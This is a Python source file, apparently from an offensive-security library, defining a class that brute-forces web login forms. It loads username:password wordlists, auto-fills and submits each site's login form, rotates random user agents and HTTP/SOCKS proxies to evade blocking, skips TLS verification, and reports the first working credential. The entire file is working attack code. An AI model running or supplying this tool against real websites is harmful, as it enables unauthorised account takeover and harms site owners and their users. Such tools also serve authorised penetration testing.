from bane.bruteforce.utils import *



class web_login_bruteforce:
    __slots__ = ["stop", "finish", "result", "logs"]

    def try_combo(self, url, username, password, cookie, user_agent, proxy, timeout,headers):
        prox = None
        cookies = None
        h = {"User-Agent": user_agent}
        if cookie:
            h.update({"Cookie": cookie})
            cookies = cookie
        h.update(headers)
        try:
            r = requests.Session().get(
                url, proxies=proxy, headers=h, verify=False, timeout=timeout
            )
        except:
            return False
        cook = None
        try:
            cook = r.headers["Set-cookie"]
        except:
            pass
        cookies = set_correct_cookies(cook, cookie=cookie)
        form = LOGIN_FORM_FILLER.set_login_form(url, r.text, username, password)
        h = {"User-Agent": user_agent}
        if cookies:
            h.update({"Cookie": cookies})
        d = form[0]
        h.update(
            {
                "Referer": form[1],
                "Origin": form[1].split("://")[0]
                + "://"
                + form[1].split("://")[1].split("/")[0],
            }
        )
        try:
            r = requests.Session().post(
                form[1], data=d, headers=h, verify=False, proxies=proxy, timeout=timeout
            )
        except:
            return False
        try:
            LOGIN_FORM_FILLER.set_login_form(url, r.text, username, password)
            return False
        except:
            return True

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None
        ):
        proxies=get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        word_list=load_word_list(word_list)
        self.stop = False
        self.finish = False
        self.logs = logs
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                word_list,
                logs,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(self, u, word_list, logs, proxies, cookie, user_agent, timeout,headers):
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(":")[0]
                password = x.split(":")[1]
                if self.logs == True:
                    print("[*]Trying: {} {}".format(username, password))
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(Common_Variables.user_agents_list)
                prox = random.choice(proxies)
                if (
                    self.try_combo(u, username, password, cookie, us, prox, timeout,headers)
                    == True
                ):
                    if self.logs == True:
                        print("[+]Success")
                    self.result = {u: username + ":" + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print("[-]Fail")
            except Exception as e:
                pass
                if self.logs == True:
                    print("[-]Fail")
        self.finish = True

